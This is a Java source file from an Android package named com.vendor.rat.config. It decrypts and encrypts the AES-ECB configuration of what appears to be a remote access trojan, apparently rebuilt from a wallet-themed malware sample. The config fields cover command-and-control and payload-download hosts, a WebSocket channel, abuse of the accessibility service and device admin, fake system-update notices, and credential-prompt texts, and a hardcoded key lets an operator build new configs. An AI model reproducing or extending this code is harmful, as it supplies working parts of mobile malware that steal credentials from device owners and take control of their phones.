package com.vendor.rat.config;

import android.util.Base64;
import android.util.Log;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * 配置文件解密器
 * 使用 AES-128-ECB 解密 Base64(URL_SAFE) 编码的配置值
 *
 * 加密参数:
 *   算法: AES / ECB / PKCS5Padding
 *   密钥: 16 字节 (AES-128)
 *   编码: Base64 URL_SAFE
 */
public class ConfigDecryptor {

    private static final String TAG = "ConfigDecryptor";
    private static final String AES_KEY = "****1qaz2wsx****";

    /**
     * 解密配置文件 JSON
     * ADAPT: vendor = com.guard.wallet.utils.d.a() — 解析 config.json 全部字段
     */
    public static AppConfig decrypt(String encryptedJson) throws Exception {
        JsonObject json = JsonParser.parseString(encryptedJson).getAsJsonObject();

        AppConfig config = new AppConfig();

        // 加密字段 (AES-ECB 解密)
        if (json.has("serverHost")) {
            config.setServerHost(decryptValue(json.get("serverHost").getAsString()));
        }
        if (json.has("downloadRatHatHost")) {
            config.setDownloadRatHatHost(decryptValue(json.get("downloadRatHatHost").getAsString()));
        }
        if (json.has("guideAccessibilityHost")) {
            config.setGuideAccessibilityHost(decryptValue(json.get("guideAccessibilityHost").getAsString()));
        }

        // webSocketUrl: 支持明文 (ws://或wss://开头) 或 AES 加密
        if (json.has("webSocketUrl") && !json.get("webSocketUrl").isJsonNull()) {
            String wsRaw = json.get("webSocketUrl").getAsString();
            if (wsRaw.startsWith("ws://") || wsRaw.startsWith("wss://")) {
                config.setWebSocketUrl(wsRaw);
            } else {
                config.setWebSocketUrl(decryptValue(wsRaw));
            }
        }

        // userEmail: 明文或加密
        if (json.has("userEmail") && !json.get("userEmail").isJsonNull()) {
            String emailRaw = json.get("userEmail").getAsString();
            if (emailRaw.contains("@")) {
                config.setUserEmail(emailRaw);
            } else {
                config.setUserEmail(decryptValue(emailRaw));
            }
        }

        // deviceAuthSecret: 明文或加密
        setStringIfPresent(json, "deviceAuthSecret", config::setDeviceAuthSecret);

        // heartbeatInterval: 心跳间隔 (秒)
        setIntIfPresent(json, "heartbeatInterval", config::setHeartbeatInterval);

        // 非加密字段 — 直接读取
        setStringIfPresent(json, "downloadRatHatName", config::setDownloadRatHatName);
        setStringIfPresent(json, "mainUrl", config::setMainUrl);
        setStringIfPresent(json, "blockIconUrl", config::setBlockIconUrl);
        setStringIfPresent(json, "blockBgColor", config::setBlockBgColor);
        setStringIfPresent(json, "trusteeId", config::setTrusteeId);
        setStringIfPresent(json, "mainActivity", config::setMainActivity);

        // 整数字段
        setIntIfPresent(json, "promotionModel", config::setPromotionModel);
        setIntIfPresent(json, "uninstall", config::setUninstall);
        setIntIfPresent(json, "activeAdmin", config::setActiveAdmin);
        setIntIfPresent(json, "debug", config::setDebug);
        setIntIfPresent(json, "perScreenOffDuration", config::setPerScreenOffDuration);
        setIntIfPresent(json, "perIdleDuration", config::setPerIdleDuration);

        // UI 文本字段 (中文/多语言)
        setStringIfPresent(json, "alertTitle", config::setAlertTitle);
        setStringIfPresent(json, "alertMsg", config::setAlertMsg);
        setStringIfPresent(json, "alertRestrictedMsg", config::setAlertRestrictedMsg);
        setStringIfPresent(json, "okText", config::setOkText);
        setStringIfPresent(json, "exitConfirm", config::setExitConfirm);
        setStringIfPresent(json, "allowRestricted", config::setAllowRestricted);
        setStringIfPresent(json, "appLabel", config::setAppLabel);
        setStringIfPresent(json, "accessibilityServiceLabel", config::setAccessibilityServiceLabel);
        setStringIfPresent(json, "launcherLabel", config::setLauncherLabel);
        setStringIfPresent(json, "aliveBlockMsg", config::setAliveBlockMsg);
        setStringIfPresent(json, "updateSystemMsg", config::setUpdateSystemMsg);
        setStringIfPresent(json, "wifiBlockMsg", config::setWifiBlockMsg);
        setStringIfPresent(json, "notificationTitle", config::setNotificationTitle);
        setStringIfPresent(json, "notificationContent", config::setNotificationContent);
        setStringIfPresent(json, "appCredentialTitle", config::setAppCredentialTitle);
        setStringIfPresent(json, "appCredentialSubTitle", config::setAppCredentialSubTitle);
        setStringIfPresent(json, "appCredentialDescription", config::setAppCredentialDescription);
        setStringIfPresent(json, "appCredentialInitMsg", config::setAppCredentialInitMsg);
        setStringIfPresent(json, "updateCredentialTitle", config::setUpdateCredentialTitle);
        setStringIfPresent(json, "updateCredentialSubTitle", config::setUpdateCredentialSubTitle);
        setStringIfPresent(json, "updateCredentialDescription", config::setUpdateCredentialDescription);

        // 引导弹窗资源
        setStringIfPresent(json, "guideDialogBgUrl", config::setGuideDialogBgUrl);
        setStringIfPresent(json, "guideDialogIcoUrl", config::setGuideDialogIcoUrl);

        return config;
    }

    private interface StringSetter { void set(String value); }
    private interface IntSetter { void set(Integer value); }

    private static void setStringIfPresent(JsonObject json, String key, StringSetter setter) {
        if (json.has(key) && !json.get(key).isJsonNull()) {
            setter.set(json.get(key).getAsString());
        }
    }

    private static void setIntIfPresent(JsonObject json, String key, IntSetter setter) {
        if (json.has(key) && !json.get(key).isJsonNull()) {
            setter.set(json.get(key).getAsInt());
        }
    }

    /**
     * AES-ECB 解密单个值
     */
    public static String decryptValue(String encrypted) throws Exception {
        // ADAPT: vendor 用标准 Base64 (含 +/)，先尝试标准再尝试 URL_SAFE
        byte[] decoded;
        try {
            decoded = Base64.decode(encrypted, Base64.DEFAULT);
        } catch (Exception e) {
            decoded = Base64.decode(encrypted, Base64.URL_SAFE);
        }
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(AES_KEY.getBytes(), "AES");
        cipher.init(Cipher.DECRYPT_MODE, keySpec);
        byte[] decrypted = cipher.doFinal(decoded);
        return new String(decrypted);
    }

    /**
     * AES-ECB 加密（生成配置时使用）
     */
    public static String encryptValue(String plainText) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        SecretKeySpec keySpec = new SecretKeySpec(AES_KEY.getBytes(), "AES");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec);
        byte[] encrypted = cipher.doFinal(plainText.getBytes());
        return Base64.encodeToString(encrypted, Base64.URL_SAFE);
    }
}
